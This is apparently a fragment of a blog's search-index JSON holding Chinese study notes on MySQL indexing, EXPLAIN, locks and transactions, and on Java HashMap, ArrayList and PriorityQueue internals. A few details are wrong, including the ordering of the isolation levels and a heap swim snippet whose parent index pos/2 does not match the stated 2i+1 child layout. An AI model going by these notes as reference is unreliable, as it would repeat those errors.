title=\"聚簇索引与非聚簇索引\"></a>聚簇索引与非聚簇索引</h3><ul>\n<li><p>InnoDB的聚簇索引就是主键索引</p>\n</li>\n<li><p>MyISAM没有聚簇索引，因为他的记录行与索引行是分开存储的。他的主键索引还是非聚簇索引</p>\n</li>\n</ul>\n<blockquote>\n<p>聚簇索引的顺序就是数据的物理存储顺序，非聚簇索引的解释是:索引顺序与数据物理排列顺序无关。正是因为如此，所以一个表最多只能有一个聚簇索引,因为物理存储只能有一个顺序。正因为一个表最多只能有一个聚簇索引，所以它显得更为珍贵，一个表设置什么为聚簇索引对性能很关键。我们可以这么理解聚簇索引：索引的叶节点就是数据节点。而非聚簇索引的叶节点仍然是索引节点，只不过有一个指针指向对应的数据块。</p>\n</blockquote>\n<p>MySQL支持两种存储引擎分别是InnoDB和MyISAM，默认使用InnoDB存储引擎，在创建数据库表的时候，InnoDB</p>\n<p>（1）首先会查看数据表中有没有主键，有的话就使用主键创建一个索引，这个主键索引就是聚簇索引</p>\n<p>（2）没有主键会寻找unique类型的字段创建主键索引，这个主键索引还是聚簇索引；</p>\n<p>（1）（2）都没有就隐式的创建rowID，还是聚簇索引。总之，InnoDB引擎创建的主键索引就是聚簇索引。聚簇索引包含主键id，数据库对应行数据和指针并将这些数据存储在B+Tree的叶子结点上。其余非主键索引全部都是辅助索引（非聚簇索引），对于InnoDB存储引擎创建的辅助索引（非聚簇索引），索引内容只包含当前字段的内容与主键id，通过查询主键id进行数据的二次查找。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613213055470.png\" alt=\"image-20220613213055470\"><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613213804686.png\" alt=\"image-20220613213804686\"></p>\n<h3 id=\"页结构：\"><a href=\"#页结构：\" class=\"headerlink\" title=\"页结构：\"></a>页结构：</h3><blockquote>\n<p>MySQL以页作为存储，每一页有页目录作为索引，页目录存储了主键值以及一个指向实际数据的指针。同时插入数据时通过二分计算主键插入的位置(排好序)。每一页大小为16KB，5.7以后增加了对32KB与64KB的支持，默认还是16KB，最大行大小约为8000字节。</p>\n</blockquote>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913114416231.png\" alt=\"image-20220913114416231\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913115920930.png\" alt=\"image-20220913115920930\"></p>\n<h3 id=\"主键索引\"><a href=\"#主键索引\" class=\"headerlink\" title=\"主键索引\"></a>主键索引</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913120100883.png\" alt=\"image-20220913120100883\"></p>\n<h3 id=\"联合索引-普通索引\"><a href=\"#联合索引-普通索引\" class=\"headerlink\" title=\"联合索引,普通索引\"></a>联合索引,普通索引</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913120205882.png\" alt=\"image-20220913120205882\"></p>\n<p>联合索引最下面不是整个数据项(太浪费空间),而是对应数据项的主键值,因此查询到结果后还需要回表查询。如果所需的数据包含在联合索引中就不需要回表，否则要回表再走一次主键索引获取到想要的数据。</p>\n<p>从左往右逐个比较类似于数字比较大小(依次比较百位,十位,个位)只要大了就整体大，因此有最左前缀匹配原则,</p>\n<p>联合索引在查找时都要符合最左前缀原则，在通过这两个索引的B+树查询到主键后，如果所需的数据就是普通索引或者包含在联合索引中就不需要回表，否则要回表再走一次主键索引获取到想要的数据</p>\n<blockquote>\n<p>如:有4个字段id,name,age,nation.首先主键索引(id)是一定存在的，然后再建立一个联合索引(name,age)执行下列语句</p>\n<p>explain select id from student  where id = 15              – 走主键索引</p>\n<p>explain select name,age from student where name = ‘aa’      – 走联合索引</p>\n<p>explain select nation,name,age from student where name=’aa’  –走联合索引但是需要回表查询nation</p>\n</blockquote>\n<p>如果id是字符型，那么前缀匹配用的是索引，中坠和后缀用的是全表扫描。</p>\n<h3 id=\"最左前缀原则\"><a href=\"#最左前缀原则\" class=\"headerlink\" title=\"最左前缀原则\"></a>最左前缀原则</h3><p><strong>索引字段中的第一个字段，也就是最左边的字段。只要有这个字段在，该sql已经就能走索引。</strong></p>\n<h3 id=\"索引失效的原因\"><a href=\"#索引失效的原因\" class=\"headerlink\" title=\"索引失效的原因\"></a>索引失效的原因</h3><p><img src=\"C:\\Users\\86188\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220913143924508.png\" alt=\"image-20220913143924508\"></p>\n<p>1，使用or关键字（但是并不是所有带or的查询都会失效，如果有两个字段，两个字段都有索引就不会失效，会走两个索引）</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913161332003.png\" alt=\"image-20220913161332003\"></p>\n<h3 id=\"建立索引技巧\"><a href=\"#建立索引技巧\" class=\"headerlink\" title=\"建立索引技巧\"></a>建立索引技巧</h3><ol>\n<li>在查询的较多的列上建立覆盖索引,覆盖要查询的字段避免回表查询</li>\n<li>可以截取字段的前几个字符作为索引，</li>\n<li>避免在重复率较高的字段上建立索引   重复率=不同的值数/总字段数</li>\n<li>更新频繁的字段上不要创建索引</li>\n<li>尽量拓展索引不要添加索引,维护起来效率低 </li>\n<li></li>\n</ol>\n<h3 id=\"为什么myisam查询比innodb快？\"><a href=\"#为什么myisam查询比innodb快？\" class=\"headerlink\" title=\"为什么myisam查询比innodb快？\"></a>为什么myisam查询比innodb快？</h3><p>主要原因有三点：</p>\n<blockquote>\n<ol>\n<li><p>查询的时候，由于innodb支持事务，所以会有mvvc的一个比较。这个过程会损耗性能。</p>\n</li>\n<li><p>查询的时候，如果走了索引，而索引又不是主键索引，此时，由于innodb是聚簇索引，会有一个回表的过程，即：先去非聚簇索引树（非主键索引树）中查询数据，找到数据对应的key之后，再通过key回表到聚簇索引树，最后找到需要的数据。而myisam是非聚集索引，而且叶子节点存储的是磁盘地址，所以，查询的时候查到的最后结果不是聚簇索引树的key，而是会直接去查询磁盘。</p>\n</li>\n<li><p>锁的一个损耗，innodb锁支持行锁，在检查锁的时候不仅检查表锁，还要看行锁。</p>\n</li>\n</ol>\n</blockquote>\n<h2 id=\"explain用法\"><a href=\"#explain用法\" class=\"headerlink\" title=\"explain用法\"></a>explain用法</h2><p>重点关注</p>\n<h3 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h3><p>  此列表示关联类型或访问类型。也就是MySQL决定如何查找表中的行。依次从最优到最差分别为：system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt; all。</p>\n<ul>\n<li><p>NULL：MySQL能在优化阶段分解查询语句，在执行阶段不用再去访问表或者索引。</p>\n</li>\n<li><p>system、const：MySQL对查询的某部分进行优化并把其转化成一个常量（可以通过show warnings命令查看结果）。system是const的一个特例，表示表里只有一条元组匹配时为system。</p>\n</li>\n<li><p> eq_ref：主键或唯一键索引被连接使用，最多只会返回一条符合条件的记录。简单的select查询不会出现这种type。</p>\n</li>\n<li><p> ref：相比eq_ref，不使用唯一索引，而是使用普通索引或者唯一索引的部分前缀，索引和某个值比较，会找到多个符合条件的行。</p>\n</li>\n<li><p>  range：通常出现在范围查询中，比如in、between、大于、小于等。使用索引来检索给定范围的行。</p>\n</li>\n<li><p> index：扫描全索引拿到结果，一般是扫描某个二级索引，二级索引一般比较少，所以通常比ALL快一点。</p>\n</li>\n<li><p> ALL：全表扫描，扫描聚簇索引的所有叶子节点。</p>\n</li>\n</ul>\n<p>所以说如果type为all或者index，都应对其进行优化。甚至我们可以将其理解相当于索引无效。</p>\n<h3 id=\"possible-keys\"><a href=\"#possible-keys\" class=\"headerlink\" title=\"possible_keys\"></a>possible_keys</h3><p>可能走的索引，如果为空说明没有索引可以走，可以添加索引提高查询效率</p>\n<h3 id=\"key\"><a href=\"#key\" class=\"headerlink\" title=\"key\"></a>key</h3><p>实际使用的索引</p>\n<h3 id=\"rows\"><a href=\"#rows\" class=\"headerlink\" title=\"rows\"></a>rows</h3><p> 此列是MySQL在查询中估计要读取的行数。注意这里不是结果集的行数</p>\n<h3 id=\"Extra\"><a href=\"#Extra\" class=\"headerlink\" title=\"Extra\"></a>Extra</h3><p>此列是一些额外信息。常见的重要值如下：</p>\n<ol>\n<li><p>Using index：使用覆盖索引（如果select后面查询的字段都可以从这个索引的树中获取，不需要通过辅助索引树找到主键，再通过主键去主键索引树里获取其它字段值，这种情况一般可以说是用到了覆盖索引）。</p>\n</li>\n<li><p>Using where：使用 where 语句来处理结果，并且查询的列未被索引覆盖。</p>\n</li>\n<li><p>Using index condition：查询的列不完全被索引覆盖，where条件中是一个查询的范围。</p>\n</li>\n<li><p>Using temporary：MySQL需要创建一张临时表来处理查询。出现这种情况一般是要进行优化的。</p>\n</li>\n<li><p>Using filesort：将使用外部排序而不是索引排序，数据较小时从内存排序，否则需要在磁盘完成排序。</p>\n</li>\n<li><p>Select tables optimized away：使用某些聚合函数（比如 max、min）来访问存在索引的某个字段时。</p>\n</li>\n</ol>\n<p>参考<code>https://blog.csdn.net/fsdfkjai/article/details/121770629</code></p>\n<h1 id=\"MySQL锁\"><a href=\"#MySQL锁\" class=\"headerlink\" title=\"MySQL锁\"></a>MySQL锁</h1><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220913144213851.png\" alt=\"image-20220913144213851\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from student lock in share mode  -- 共享锁(读锁)</span><br><span class=\"line\">select * from student for update\t\t-- 排他锁(写锁)</span><br><span class=\"line\">-- update,delete,insert 会自动增加排它锁</span><br></pre></td></tr></table></figure>\n\n<p>读与读锁是有区别的普通的select是不会加锁的，只是普通的读取数据</p>\n<h1 id=\"MySQL事务\"><a href=\"#MySQL事务\" class=\"headerlink\" title=\"MySQL事务\"></a>MySQL事务</h1><p>4个隔离级别(效率由高到低)</p>\n<p>读已提交</p>\n<p>读未提交</p>\n<p>可重复读</p>\n<p>串行</p>\n","categories":["MySQL"],"tags":["hexo"]},{"title":"JAVA集合类","url":"/p/65046/","content":"<h2 id=\"HashMap\"><a href=\"#HashMap\" class=\"headerlink\" title=\"HashMap\"></a>HashMap</h2><p>由于Integer最大值为2^31-1,索引最大可以取到2^30次方</p>\n<h3 id=\"容量必须是2的整数幂\"><a href=\"#容量必须是2的整数幂\" class=\"headerlink\" title=\"容量必须是2的整数幂\"></a>容量必须是2的整数幂</h3><ol>\n<li><p>通过hashcode计算位置时可以通过位运算逻辑与 hashcode&amp;(hashmap的容量-1)也就是全为1的状态比如41 —- hashcode为00101001  与容量32 也就是00011111 作与运算得到00001001也就是8可以与%得到同样的效果，而位运算的效率比%高很多</p>\n</li>\n<li><p>扩容时，扩容大小也是2的倍数可以将产生hash碰撞的元素,完美的转移到新的table中去<br>仅只用了O（n）的时间复杂度，就将数据完成了转移</p>\n</li>\n</ol>\n<h3 id=\"java1-7插入链表是头插-java1-8后是尾插\"><a href=\"#java1-7插入链表是头插-java1-8后是尾插\" class=\"headerlink\" title=\"java1.7插入链表是头插,java1.8后是尾插\"></a>java1.7插入链表是头插,java1.8后是尾插</h3><p>原因:多线程环境下,在同时扩容时由于头插会使得顺序翻转,导致产生环形链表产生造成死循环。<br>使用头插会改变链表的上的顺序，但是如果使用尾插，在扩容时会保持链表元素原本的顺序，就不会出现链表成环的问题了。</p>\n<h3 id=\"重写equals方法也要重写hashCode方法\"><a href=\"#重写equals方法也要重写hashCode方法\" class=\"headerlink\" title=\"重写equals方法也要重写hashCode方法\"></a>重写equals方法也要重写hashCode方法</h3><p>hashmap中value的查找是通过 key 的 hashcode 来查找，所以对自己的对象必须重写 hashcode 方法通过  hashcode 找到对象地址后会用 equals 比较你传入的对象和 hashmap 中的 key 对象是否相同,因此还要重写 equals。保证相同的对象返回相同的hash值，不同的对象返回不同的hash值。</p>\n<h3 id=\"获取距离一个数最近的2的整数幂\"><a href=\"#获取距离一个数最近的2的整数幂\" class=\"headerlink\" title=\"获取距离一个数最近的2的整数幂\"></a>获取距离一个数最近的2的整数幂</h3><p>方法1:从1开始不断乘2直至大于目标<br>方法2:通过位运算不断右移并进行逻辑右移(HashMap)并且进行或运算直到把后面全部变成1</p>\n<p>tableSizeFor方法:通过位运算返回一个最小的大于入参的二次幂</p>\n<p>方法3:通过Integer.numberOfLeadingZeros计算目标数有几个前置0,把后面全部赋值为1</p>\n<h3 id=\"resize方法\"><a href=\"#resize方法\" class=\"headerlink\" title=\"resize方法:\"></a>resize方法:</h3><p>1.判断是否第一次初始化,如果不是再判断长度有没有达到最大值,达到了就直接返回不扩容<br>否则通过右移一位扩大一倍同时计算性阈值。生成新的Node数组然后进行旧元素的迁移<br>2.如果是第一次初始化且调用了默认的构造函数,没有给定hashmap的长度大小则把默认值赋值给<br>容量以及阈值,生成新的Node数组然后返回，不需要迁移旧元素。<br>3.如果是第一次初始化且给定了hashmap的长度,则赋值长度与阈值同时生成新的Node数组并返回<br>同上。</p>\n<p>旧元素迁移:扩容容量通过左移变为原来的两倍,然后通过遍历所有节点,分为3种情况,分别是①单独的节点②红黑树③链表<br>  第一种情况直接将原来节点的hash与新数组长度-1逻辑与运算得到坐标<br>  第二种情况将节点通过split方法操作红黑树<br>  第三种情况链表,此时由于哈希冲突而放在一起的Node节点可能在新的HashMap中有的位置,<br>  因此需要遍历链表上的所有元素,分别取hash值与旧容量做与运算,如果得到0表示位置不用变,<br>  如果是1就放到新的位置(原来的位置坐标+旧hashmap容量)</p>\n<p>  红黑树迁移步骤:<br>  注意TreeNode有5个指针,分别是左右子树,parent,next,prev也就是说既是树又是链表两层关系,方便红黑树与链表的相互转换<br>  如果当前节点属于TreeNode则强转并调用split方法,split方法中类似于链表的扩容,先把判断每一个树的节点,确实节点是放在<br>  新链表还是旧链表,遍历完成后判断旧链表数量是否小于6,小于6需要将该树转为链表(也就是把TreeNode节点通过replacementNode转化为Node节点)<br>  如果大于6说明还是保持树,先看看新链表有没有数据,没有就不用转保持原样,否则还是要转换。新链表操作同旧链表</p>\n<p>  链表迁移步骤:<br>  因为容量扩大了一倍所以,链表新元素的位置可能不变,也有可能在下一段同样的位置,也就是扩容段同样的位置<br>  是否变取决于hash值&amp;旧容量的值为1还是0,0不变1变<br>  例如:原来hash为10(1010),hashmap容量为16(10000),原来的位置10 &amp; (16-1) 也就是 1010 &amp; 1111 = 1010<br>  扩容后:hash不变,hashmap容量为32(100000),扩容后位置为10 &amp; (32-1) 也就是 1010 &amp; 11111 = 01010 首位是0不用变化,保持原位<br>  在</p>\n<p>  假设与10同链表的另一个节点hash为26(11010),原来的位置为 11010 &amp; (16-1) 也就是11010 &amp; 1111 = 1010<br>  扩容后:hash不变,hashmap容量为32(100000),扩容后位置为26 &amp; (32-1) 也就是 11010 &amp; 11111 = 11010<br>  首位是1放到下一个位置也就是(原来的位置坐标+旧hashmap容量)</p>\n<p>  可以看出位置是否变化取决于最高位是1还是0,因此在hashmap中,直接用hash &amp; 旧容量也就是10 &amp; 16 与26 &amp; 16<br>  也就是01010 &amp; 10000 = 0与11010 &amp; 10000 = 1,前者不变，后者移动</p>\n<p>  可以理解为做了两次哈希先找到在旧map的位置,再做一次哈希,长度只有2,要么在前面要么在后面,取决于最高位。这也是hashmap的容量<br>  必须为2的n次幂的好处,方便元素的迁移</p>\n<p>  ①设置4个节点,新旧链表的头尾节点<br>  ②通过判断hash &amp; oldCap是否为0,0则放到就链表,1则放到新链表<br>  ③把所有的元素放完后有了新旧两条链表,判断是否为空,旧链表非空则放到原来的位置,新链表非空则放到(原来位置+旧hashmap容量)的位置</p>\n<h3 id=\"put方法\"><a href=\"#put方法\" class=\"headerlink\" title=\"put方法:\"></a>put方法:</h3><ol>\n<li>第一次put由于数组还没有初始化需要初始化扩容</li>\n<li>如果数组已经初始化了,则通过&amp;运算计算下标,判断改下标元素是否为空,为空则直接放上去</li>\n<li>不为空则分3种情况:<br> ①该位置节点的hash相等并且key也相等则直接更新元素的value<br> ②该位置节点属于TreeNode,通过红黑树内部类方法把他放上去<br> ③该位置节点下有链表,通过for遍历比较链表上每一个节点的key是否相同,相同则什么都不做(循环完成后会更新),不相同则继续<br> 知道循环了8次后,此时要转变为红黑树,这时树上有9个节点而不是8个</li>\n<li>如果有key重复的把找到的重复key覆盖更新value</li>\n<li>增加modCount修改次数用于控制并发,防止多线程修改导致数据不一致,当expectedModCount与modCount不一样时会抛出ConcurrentModificationException()异常</li>\n<li>判断当前元素数量是否大于阈值,如果是就进行扩容</li>\n</ol>\n<p>putIfAbsent:当没有这个key才放进去,否则不操作</p>\n<h3 id=\"get方法\"><a href=\"#get方法\" class=\"headerlink\" title=\"get方法:\"></a>get方法:</h3><p>1.判断数组是否为空然后通过与数组长度-1作与运算获得key的下标得到数组对应位置的元素<br>2.首先判断该元素的key是否与入参的key相同,相同则返回<br>3.不相同则判断是否有next,然后如果有且是红黑树则通过红黑树取元素,否则通过链表遍历获取元素</p>\n<h3 id=\"红黑树与链表的转换\"><a href=\"#红黑树与链表的转换\" class=\"headerlink\" title=\"红黑树与链表的转换\"></a>红黑树与链表的转换</h3><p>数组长度当大于64且链表长度大于8时会转变红黑树,小于64且小于6转变为链表</p>\n<h3 id=\"扰动函数\"><a href=\"#扰动函数\" class=\"headerlink\" title=\"扰动函数\"></a>扰动函数</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> <span class=\"title\">hash</span><span class=\"params\">(Object key)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> h;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (key == <span class=\"keyword\">null</span>) ? <span class=\"number\">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class=\"number\">16</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>key.hashcode()方法返回一个int(4字节,32位)。</p>\n<p>先将hashcode右移16位剩下高位,高位再与hashcode做异或运算,使得高低位都参与hashcode的计算,让计算出来的hash值更加不确定还减少hash碰撞</p>\n<h2 id=\"ArrayList\"><a href=\"#ArrayList\" class=\"headerlink\" title=\"ArrayList\"></a>ArrayList</h2><h3 id=\"Fast-Fail\"><a href=\"#Fast-Fail\" class=\"headerlink\" title=\"Fast-Fail\"></a>Fast-Fail</h3><p>ArrayList,Vector等拥有modCount变量的集合类,如果通过迭代器遍历集合过程中调用集合类的remove,add或者其他会修改modCount的方法会抛出``ConcurrentModificationException`,modCount用于记录集合的修改次数,在获得迭代器对象时会自动把modCount赋值给expectedModCount,修改集合后modCount会发生变化,在下一次获得next时会自动比较expectedModCount与modCount是否相等，不相等则直接抛出异常。这是集合类fast-fail的体现。是为了防止在通过迭代器迭代时其他线程去修改集合引发错误。虽然错误不一定发生。</p>\n<p>“快速失败”也就是fail-fast，它是<a href=\"http://lib.csdn.net/base/javase\">Java</a>集合的一种错误检测机制。当多个线程对集合进行结构上的改变的操作时，有可能会产生fail-fast机制。记住是有可能，而不是一定。例如：假设存在两个线程（线程1、线程2），线程1通过Iterator在遍历集合A中的元素，在某个时候线程2修改了集合A的结构（是结构上面的修改，而不是简单的修改集合元素的内容），那么这个时候程序就会抛出 ConcurrentModificationException 异常，从而产生fail-fast机制。</p>\n<pre><code>换成Vector还是会出现这种错误.原因在于，虽然Vector的方法采用了synchronized进行了同步，但是实际上通过Iterator访问的情况下，每个线程里面返回的是不同的iterator，也即是说expectedModCount是每个线程私有。假若此时有2个线程，线程1在进行遍历，线程2在进行修改，那么很有可能导致线程2修改后导致Vector中的modCount自增了，线程2的expectedModCount也自增了，但是线程1的expectedModCount没有自增，此时线程1遍历时就会出现expectedModCount不等于modCount的情况了。\n</code></pre>\n<p>解决方案:</p>\n<p>单线程:使用迭代器的remove方法而不是集合类的remove方法</p>\n<p>多线程:1. 在使用iterator迭代的时候使用synchronized或者Lock进行同步；</p>\n<p>​            2.使用并发容器<code>CopyOnWriteArrayList</code>代替ArrayList和Vector。</p>\n<p>​            3.通过<code>Collections.synchronizedList(integers);</code>并在使用时上</p>\n<p>锁，其实这个方法返回值为Collections的静态内部类SynchronizedList,里面所有的方法都通过synchronized锁住类对象，然后代理原来List的方法,但是个别方法没有添加synchronize比如获取迭代器时，因此在使用时如果获取迭代器需要添加synchronize关键字保证线程安全。这么看来这种方法效率也不高。最后使用杀手锏</p>\n<p>​            4. 通过juc的阻塞队列与非阻塞队列</p>\n<h3 id=\"CopyOnWrite\"><a href=\"#CopyOnWrite\" class=\"headerlink\" title=\"CopyOnWrite\"></a>CopyOnWrite</h3><p>（简称COW），是计算机程序设计领域中的一种优化策略，也是一种思想–即写入时复制思想。</p>\n<p>那么，什么是写入时复制思想呢？就是当有多个调用者同时去请求一个资源时(可以是内存中的一个数据)，当其中一个调用者要对资源进行修改，系统会copy一个副本给该调用者，让其进行修改；而其他调用者所拥有资源并不会由于该调用者对资源的改动而发生改变。这就是写入时复制思想；</p>\n<p>以 add 方法为例，每次 add 时，都会用 Arrays.copyOf 创建一个新数组，频繁 add 时内存的申请释放消耗会很大。所以CopyOnWriteArrayList** 并发容器用于读多写少的并发场景。比如<strong>白名单，黑名单，商品类目的访问和更新场景</strong></p>\n<h3 id=\"List与Set区别\"><a href=\"#List与Set区别\" class=\"headerlink\" title=\"List与Set区别\"></a>List与Set区别</h3><p>List、Set都继承自Collection接口；List的特点：元素有放入顺序，且可重复；Set的特点：元素无放入顺序，且不可重复（注意：元素虽然无放入顺序，但是元素在Set中的位置是由该元素的HashCode决定的，其位置是固定的）。List支持for循环，也就是通过下标来遍历，也可以用迭代器，但是Set只能用迭代器，因为他无序，无法使用下标取值；<br>List接口有三个实现类：LinkedList,ArrayList,Vector。Set接口有两个实现类：HashSet（底层由HashMap实现），LinkedHashSet<br>Set：检索元素效率低，删除和插入效率高，插入和删除不会引起元素位置改变。List：和数组类似，List可以动态增长，查找元素效率高，插入删除元素效率低，因为会引起其他元素位置改变。</p>\n<h3 id=\"HashSet与HashMap\"><a href=\"#HashSet与HashMap\" class=\"headerlink\" title=\"HashSet与HashMap\"></a>HashSet与HashMap</h3><p>1、HashSet底层是采用HashMap实现的。HashSet 的实现比较简单，HashSet 的绝大部分方法都是通过调用 HashMap 的方法来实现的，因此 HashSet 和 HashMap 两个集合在实现本质上是相同的。<br>2、HashMap的key就是放进HashSet中对象，value是Object类型的。<br>3、当调用HashSet的add方法时，实际上是向HashMap中增加了一行(key-value对)，该行的key就是向HashSet增加的那个对象，该行的value就是一个Object类型的常量</p>\n<p>4、Hashtable和HashMap它们两个内部实现方式的数组的初始大小和扩容的方式。HashTable中hash数组默认大小是11，增加的方式是 old*2+1。HashMap中hash数组的默认大小是16，而且一定是2的指数。</p>\n<h3 id=\"HashMap与HashTable\"><a href=\"#HashMap与HashTable\" class=\"headerlink\" title=\"HashMap与HashTable\"></a>HashMap与HashTable</h3><p>前者线程不安全,后者线程安全(通过在方法前加Synchronize)。Hashtable 中的方法是同步的，而HashMap中的方法在缺省情况下是非同步的。在多线程并发的环境下，可以直接使用Hashtable，但是要使用HashMap的话就要自己增加同步处理了。</p>\n<h3 id=\"HashSet如何实现去重\"><a href=\"#HashSet如何实现去重\" class=\"headerlink\" title=\"HashSet如何实现去重\"></a>HashSet如何实现去重</h3><p>通过hashcode比较如果相同,再通过equals方法比较。两者都相等说明重复了</p>\n<p> 对于自定义类的对象</p>\n<p>​              new Student(“zhangsan”,21)    </p>\n<p>​              new Student(“zhangsan”,21)</p>\n<p> 这两个对象是可以存到HastSet中的，因为它们是new的新的 所以他们的哈希值是不同的，但这不是我们希望的，所以我们要在Student类中重写hashCode()方法和equals()方法</p>\n<h3 id=\"遍历方式对比\"><a href=\"#遍历方式对比\" class=\"headerlink\" title=\"遍历方式对比\"></a>遍历方式对比</h3><p>for,增强for(foreach),迭代器一共3种,foreach底层也是通过迭代器实现</p>\n<p>for 循环和迭代器 Iterator对比：<br>①ArrayList对随机访问比较快，而for循环中的get(),采用的即是随机访问的方法，因此在ArrayList里，for循环较快<br>②采用LinkedList 则是顺序访问比较快，lterator中的next(),采用的即是顺序访问的方法，因此在LinkedList里，使用Iterator较快。</p>\n<p>③从数据结构角度分析，for循环适合访问顺序结构，可以根据下标快速获取指定元素。而lterator适合一为选代器是通过next()和Pre()来定位的，可以访问没有顺序的集合。</p>\n<p>​                                    <strong>总结:数组用for,链表用迭代器</strong></p>\n<p>④使用 Iterator 的好处在于可以用相同方式去遍历集合中元素，而无需考虑集合类的内部实现（只要它实现用lterator来遍历集合中元素，一旦不再使用List转而使用Set来组织数据，那遍历元素的代码不用做任何修改；如果使用for来遍历，那所有遍历此集合的算法都得做相应调整。因为List有序，Set无序，结构不同，它们的访问算法也不一样。（由此也说明遍历和集合本身分离了） 解耦!!!任何东西都可以通过加一层实现解耦:smile:</p>\n<h3 id=\"ArrayList扩容\"><a href=\"#ArrayList扩容\" class=\"headerlink\" title=\"ArrayList扩容\"></a>ArrayList扩容</h3><p>默认长度为10,每次插入数据时会先检查容量够不够，不够会进行扩容，否则直接将元素放在下一个位置。在jdk1.8中，当new一个ArrayList时，底层不会立马去创建一个10个长度的数组，而是创建一个空数组，在list执行第一次add方法时才会进行创建，这样是为了节省内存，当当前有效元素个数大于数组长度时，也是进行1.5倍的一个扩容。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220920101246836.png\" alt=\"image-20220920101246836\"></p>\n<p>数组在java里是一种特殊类型，既不是基本数据类型也不是引用数据类型。<br>有别于普通的“类的实例”对象，java里数组不是类，所以也就没有对应的class文件，数组类型是由jvm从元素类型合成出来的；<br>在jvm中获取数组的长度是用arraylength这个专门的字节码指令的；<br>在数组的对象头里有一个_length字段，记录数组长度，只需要去读_length字段就可以了。<br>所以ArrayList中定义的最大长度为Integer最大值减8，这个8就是就是存了数组_length字段。<br>————————————————<br>版权声明：本文为CSDN博主「langzilige」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/li646495946/article/details/124725639\">https://blog.csdn.net/li646495946/article/details/124725639</a></p>\n<h2 id=\"PriorityQueue\"><a href=\"#PriorityQueue\" class=\"headerlink\" title=\"PriorityQueue\"></a>PriorityQueue</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>是Queue的唯一直接实现类，其他在juc下</p>\n<p>一个基于优先级堆的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，或者根据构造队列时提供的 Comparator  进行排序，具体取决于所使用的构造方法。优先级队列不允许使用 null 元素。依靠自然顺序的优先级队列还不允许插入不可比较的对象，不可排序的对象可能导致  ClassCastException。因为无法排序</p>\n<p>此队列的头是按指定排序方式确定的最小元素。如果多个元素都是最小值，则头是其中一个元素——选择方法是任意的。队列获取操作  poll、remove、peek 和 element  访问处于队列头的元素。优先级队列是无界的，但是有一个内部容量，控制着用于存储队列元素的数组大小。它通常至少等于队列的大小。随着不断向优先级队列添加元素，其容量会自动增加。无需指定容量增加策略的细节。</p>\n<p>内部容量默认为11；</p>\n<blockquote>\n<p>有界队列：就是有固定大小的队列。比如设定了固定大小的 LinkedBlockingQueue，又或者大小为 0，只是在生产者和消费者中做中转用的 SynchronousQueue。</p>\n<p>无界队列：指的是没有设置固定大小的队列。这些队列的特点是可以直接入列，直到溢出。当然现实几乎不会有到这么大的容量（超过 Integer.MAX_VALUE），所以从使用者的体验上，就相当于 “无界”。比如没有设定固定大小的 LinkedBlockingQueue。</p>\n<p>集合类基本上都是无界的</p>\n<p>在线程池的配置中，任务队列一般使用无界的LinkedBlockingQueue(默认是无界的)，因此JVM内存可能被撑爆,产生OOM，因此一定要为这个队列设置初始容量</p>\n</blockquote>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a><strong>实现</strong></h3><p>底层是数组，知道父节点的坐标就可以求出儿子节点的坐标</p>\n<p>a[i]为父节点，a[2i+1],a[2i+2]为子节点</p>\n<p>因此在小顶堆中</p>\n<p>a[i]&lt;a[2i+1] &amp;&amp; a[i]&lt;a[2i+2]</p>\n<p>在大顶堆中</p>\n<p>a[i]&gt;a[2i+1] &amp;&amp; a[i]&gt;a[2i+2]        &amp;&amp;具有短路功能,前面为false就不会执行。&amp;不可以</p>\n<p>因此只用一个数组就可以维护一个堆</p>\n<h4 id=\"增加add\"><a href=\"#增加add\" class=\"headerlink\" title=\"增加add\"></a>增加add</h4><p>其中最核心的两个操作是上浮swim和下沉sink：如果一个节点比父节点大，那<br>么需要交换这个两个节点；交换后还可能比它新的父节点大，因此需要不断地进行比较和交换操<br>作，我们称之为上浮；类似地，如果一个节点比父节小，也需要不断地向下进行比较和交换操作，<br>我们称之为下沉。如果一个节点有两个子节点，我们总是交换最大的子节点。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">swim</span><span class=\"params\">(<span class=\"keyword\">int</span> pos)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (pos &gt; <span class=\"number\">0</span> &amp;&amp; heap[pos/<span class=\"number\">2</span>] &lt; heap[pos]) <span class=\"comment\">//父小于子</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">swap</span>(heap[pos/<span class=\"number\">2</span>], heap[pos]); <span class=\"comment\">//父子交换</span></span><br><span class=\"line\">\t\tpos = pos / <span class=\"number\">2</span>;                <span class=\"comment\">//以父为子</span></span><br><span 